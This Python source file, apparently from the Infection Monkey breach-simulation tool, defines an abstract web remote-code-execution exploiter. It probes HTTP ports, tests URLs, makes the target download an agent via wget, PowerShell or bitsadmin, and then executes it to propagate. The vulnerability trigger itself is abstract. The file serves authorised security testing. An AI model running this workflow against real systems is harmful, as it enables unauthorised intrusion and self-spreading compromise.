import logging
from abc import abstractmethod
from posixpath import join
from typing import List, Tuple, Union

from common import OperatingSystem
from common.types import NetworkPort, NetworkService, PortStatus
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.i_puppet import TargetHost
from infection_monkey.model import (
    BITSADMIN_CMDLINE_HTTP,
    CHECK_COMMAND,
    CHMOD_MONKEY,
    DOWNLOAD_TIMEOUT,
    DROPPER_ARG,
    ID_STRING,
    MONKEY_ARG,
    POWERSHELL_HTTP_UPLOAD,
    RUN_MONKEY,
    WGET_HTTP_UPLOAD,
)
from infection_monkey.utils.commands import (
    DROPPER_TARGET_PATH_LINUX,
    DROPPER_TARGET_PATH_WIN64,
    build_monkey_commandline,
)
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)
# Command used to check if monkeys already exists
POWERSHELL_NOT_FOUND = "powershell is not recognized"


class WebRCE(HostExploiter):
    def __init__(self, monkey_target_paths=None):
        """
        :param monkey_target_paths: Where to upload the monkey at the target host system.
        Dict in format {'linux': '/tmp/monkey.sh', 'win64':... }
        """
        super(WebRCE, self).__init__()
        self.monkey_target_paths = monkey_target_paths
        self.vulnerable_urls = []

    def get_exploit_config(self):
        """
        Method that creates a dictionary of configuration values for exploit
        :return: configuration dict
        """
        exploit_config = {}

        # dropper: If true monkey will use dropper parameter that will detach monkey's process
        # and try to copy
        # it's file to the default destination path.
        exploit_config["dropper"] = False

        # upload_commands: Unformatted dict with one or two commands {'linux': WGET_HTTP_UPLOAD,
        # 'windows': WIN_CMD}
        # Command must have "monkey_path" and "http_path" format parameters. If None defaults
        # will be used.
        exploit_config["upload_commands"] = None

        # url_extensions: What subdirectories to scan (www.domain.com[/extension]). Eg. ["home",
        # "index.php"]
        exploit_config["url_extensions"] = []

        # stop_checking_urls: If true it will stop checking vulnerable urls once one was found
        # vulnerable.
        exploit_config["stop_checking_urls"] = False

        return exploit_config

    def _exploit_host(self):
        """
        Method that contains default exploitation workflow
        :return: True if exploited, False otherwise
        """
        # We get exploit configuration
        exploit_config = self.get_exploit_config()
        # Get open ports
        ports = self.get_ports_w(self.http_ports, [NetworkService.HTTP])
        if not ports:
            return False
        # Get urls to try to exploit
        potential_urls = self.build_potential_urls(
            self.host.ip, ports, exploit_config["url_extensions"]
        )
        self.add_vulnerable_urls(potential_urls, exploit_config["stop_checking_urls"])

        # Upload the right monkey to target
        data = self.upload_monkey(self.get_target_url(), exploit_config["upload_commands"])

        if data is False:
            return False

        # Change permissions to transform monkey into executable file
        if self.change_permissions(self.get_target_url(), data["path"]) is False:
            return False

        # Execute remote monkey
        if (
            self.execute_remote_monkey(
                self.get_target_url(), data["path"], exploit_config["dropper"]
            )
            is False
        ):
            return False

        return True

    def pre_exploit(self):
        if not self.monkey_target_paths:
            self.monkey_target_paths = {
                "linux": DROPPER_TARGET_PATH_LINUX,
                "windows": DROPPER_TARGET_PATH_WIN64,
            }
        self.http_ports = [NetworkPort(port) for port in self.options["http_ports"]]
        super().pre_exploit()

    @abstractmethod
    def exploit(self, url, command):
        """
        A reference to a method which implements web exploit logic.
        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        raise NotImplementedError()

    @staticmethod
    def get_open_service_ports(
        target_host: TargetHost, port_list: List[NetworkPort], services: List[NetworkService]
    ) -> List[Tuple[NetworkPort, bool]]:
        """
        :param target_host: TargetHost object that exploiter is targeting
        :param port_list: Potential ports to exploit. For example _config.HTTP_PORTS
        :param services: List of NetworkService objects
        :return: Ports of the target host which are open and match the given
                 criteria (port exists in the given list of ports and port's service
                 exists in the given list of services), and whether they are HTTPS
        """
        return [
            (psd.port, psd.service == NetworkService.HTTPS)
            for psd in target_host.ports_status.tcp_ports.values()
            if psd.service in services and psd.status == PortStatus.OPEN and psd.port in port_list
        ]

    def get_command(self, path, http_path, commands):
        try:
            if OperatingSystem.WINDOWS == self.host.operating_system:
                command = commands["windows"]
            else:
                command = commands["linux"]
            # Format command
            command = command % {"monkey_path": path, "http_path": http_path}
        except KeyError:
            logger.error(
                "Provided command is missing/bad for this type of host! "
                "Check upload_monkey function docs before using custom monkey's upload "
                "commands."
            )
            return False
        return command

    def check_if_exploitable(self, url):
        """
        Checks if target is exploitable by interacting with url
        :param url: Url to exploit
        :return: True if exploitable and false if not
        """
        try:
            resp = self.exploit(url, CHECK_COMMAND)
            if resp is True:
                return True
            elif resp is not False and ID_STRING in resp:
                return True
            else:
                return False
        except Exception as e:
            logger.error("Host's exploitability check failed due to: %s" % e)
            return False

    @staticmethod
    def build_potential_urls(ip: str, ports: List[Tuple[str, bool]], extensions=None) -> List[str]:
        """
        Build all possibly-vulnerable URLs on a specific host, based on the relevant ports and
        extensions.
        :param ip: IP address of the victim
        :param ports: Array of ports. One port is described as size 2 array: [port.no(int),
        isHTTPS?(bool)]
        Eg. ports: [[80, False], [443, True]]
        :param extensions: What subdirectories to scan. www.domain.com[/extension]
        :return: Array of url's to try and attack
        """
        url_list = []
        if extensions:
            extensions = [(e[1:] if "/" == e[0] else e) for e in extensions]
        else:
            extensions = [""]
        for port in ports:
            for extension in extensions:
                if port[1]:
                    protocol = "https"
                else:
                    protocol = "http"
                url_list.append(join(("%s://%s:%s" % (protocol, ip, port[0])), extension))
        if not url_list:
            logger.info("No attack url's were built")
        return url_list

    def add_vulnerable_urls(self, urls, stop_checking=False):
        """
        Gets vulnerable url(s) from url list
        :param urls: Potentially vulnerable urls
        :param stop_checking: If we want to continue checking for vulnerable url even though one
        is found (bool)
        :return: None (we append to class variable vulnerable_urls)
        """
        for url in interruptible_iter(urls, self.interrupt):
            if self.check_if_exploitable(url):
                self.add_vuln_url(url)
                self.vulnerable_urls.append(url)
                if stop_checking:
                    break
        if not self.vulnerable_urls:
            logger.info("No vulnerable urls found, skipping.")

    # Wrapped functions:
    def get_ports_w(
        self, ports: List[NetworkPort], services: List[NetworkService]
    ) -> Union[bool, List[Tuple[NetworkPort, bool]]]:
        """
        Get ports wrapped with log
        :param ports: Potential ports to exploit. For example WormConfiguration.HTTP_PORTS
        :param services: List of NetworkService objects
        :return: Array of ports: [[80, False], [443, True]] or False. Port always consists of [
        port.nr, IsHTTPS?]
        """
        ports = WebRCE.get_open_service_ports(self.host, ports, services)
        if not ports:
            logger.info("All default web ports are closed on %r, skipping", str(self.host))
            return False
        else:
            return ports

    def run_backup_commands(self, resp, url, dest_path, http_path):
        """
        If you need multiple commands for the same os you can override this method to add backup
        commands
        :param resp: Response from base command
        :param url: Vulnerable url
        :param dest_path: Where to upload monkey
        :param http_path: Where to download monkey from
        :return: Command's response (same response if backup command is not needed)
        """
        if not isinstance(resp, bool) and POWERSHELL_NOT_FOUND in resp:
            logger.info("Powershell not found in host. Using bitsadmin to download.")
            backup_command = BITSADMIN_CMDLINE_HTTP % {
                "monkey_path": dest_path,
                "http_path": http_path,
            }
            resp = self.exploit(url, backup_command)
        return resp

    def upload_monkey(self, url, commands=None):
        """
        :param url: Where exploiter should send it's request
        :param commands: Unformatted dict with one or two commands {'linux': LIN_CMD, 'windows':
        WIN_CMD}
        Command must have "monkey_path" and "http_path" format parameters.
        :return: {'response': response/False, 'path': monkeys_path_in_host}
        """
        logger.info("Trying to upload monkey to the host.")
        if not self.host.operating_system:
            logger.error("Unknown target's os type. Skipping.")
            return False

        dropper_target_path = self.monkey_target_paths[self.host.operating_system]
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, self.agent_binary_repository, self.tcp_port_selector
        )
        if not http_path:
            logger.debug("Exploiter failed, http transfer creation failed.")
            return False
        logger.info("Started http server on %s", http_path)
        # Choose command:
        if not commands:
            commands = {"windows": POWERSHELL_HTTP_UPLOAD, "linux": WGET_HTTP_UPLOAD}
        command = self.get_command(dropper_target_path, http_path, commands)
        resp = self.exploit(url, command)
        self.add_executed_cmd(command)
        resp = self.run_backup_commands(resp, url, dropper_target_path, http_path)

        http_thread.join(DOWNLOAD_TIMEOUT)
        http_thread.stop()
        logger.info("Uploading process finished")
        # If response is false exploiter failed
        if resp is False:
            return resp
        else:
            return {"response": resp, "path": dropper_target_path}

    def change_permissions(self, url, path, command=None):
        """
        Method for linux hosts. Makes monkey executable
        :param url: Where to send malicious packets
        :param path: Path to monkey on remote host
        :param command: Formatted command for permission change or None
        :return: response, False if failed and True if permission change is not needed
        """
        logger.info("Changing monkey's permissions")
        if OperatingSystem.WINDOWS == self.host.operating_system:
            logger.info("Permission change not required for windows")
            return True
        if not command:
            command = CHMOD_MONKEY % {"monkey_path": path}
        try:
            resp = self.exploit(url, command)
        except Exception as e:
            logger.error("Something went wrong while trying to change permission: %s" % e)
            return False
        # If exploiter returns True / False
        if isinstance(resp, bool):
            logger.info("Permission change finished")
            return resp
        # If exploiter returns command output, we can check for execution errors
        if "Operation not permitted" in resp:
            logger.error("Missing permissions to make monkey executable")
            return False
        elif "No such file or directory" in resp:
            logger.error(
                "Could not change permission because monkey was not found. Check path " "parameter."
            )
            return False
        logger.info("Permission change finished")
        return resp

    def execute_remote_monkey(self, url, path, dropper=False):
        """
        This method executes remote monkey
        :param url: Where to send malicious packets
        :param path: Path to monkey on remote host
        :param dropper: Should remote monkey be executed with dropper or with monkey arg?
        :return: Response or False if failed
        """
        logger.info("Trying to execute remote monkey")
        # Get monkey command line
        if dropper and path:
            # If dropper is chosen we try to move monkey to default location
            default_path = self.get_default_dropper_path()
            if default_path is False:
                return False
            monkey_cmd = build_monkey_commandline(
                self.servers, self.current_depth + 1, default_path
            )
            command = RUN_MONKEY % {
                "monkey_path": path,
                "monkey_type": DROPPER_ARG,
                "parameters": monkey_cmd,
            }
        else:
            monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
            command = RUN_MONKEY % {
                "monkey_path": path,
                "monkey_type": MONKEY_ARG,
                "parameters": monkey_cmd,
            }
        try:
            logger.info("Trying to execute monkey using command: {}".format(command))
            resp = self.exploit(url, command)
            # If exploiter returns True / False
            if isinstance(resp, bool):
                logger.info("Execution attempt successfully finished")
                self.add_executed_cmd(command)
                return resp
            # If exploiter returns command output, we can check for execution errors
            if "is not recognized" in resp or "command not found" in resp:
                logger.error("Wrong path chosen or other process already deleted monkey")
                return False
            elif "The system cannot execute" in resp:
                logger.error("System could not execute monkey")
                return False
        except Exception as e:
            logger.error("Something went wrong when trying to execute remote monkey: %s" % e)
            return False
        logger.info("Execution attempt finished")

        self.add_executed_cmd(command)
        return resp

    def get_default_dropper_path(self):
        """
        Gets default dropper path for the host.
        :return: Default monkey's destination path for corresponding host or False if failed.
        """
        if not self.host.operating_system or (
            self.host.operating_system != OperatingSystem.LINUX
            and self.host.operating_system != OperatingSystem.WINDOWS
        ):
            logger.error("Target's OS was either unidentified or not supported. Aborting")
            return False
        if self.host.operating_system == OperatingSystem.LINUX:
            return DROPPER_TARGET_PATH_LINUX
        if self.host.operating_system == OperatingSystem.WINDOWS:
            return DROPPER_TARGET_PATH_WIN64

    def get_target_url(self):
        """
        This method allows "configuring" the way in which a vulnerable URL is picked.
        If the same URL should be used - always return the first.
        Otherwise - implement your own.
        :return: a vulnerable URL
        """
        return self.vulnerable_urls[0]
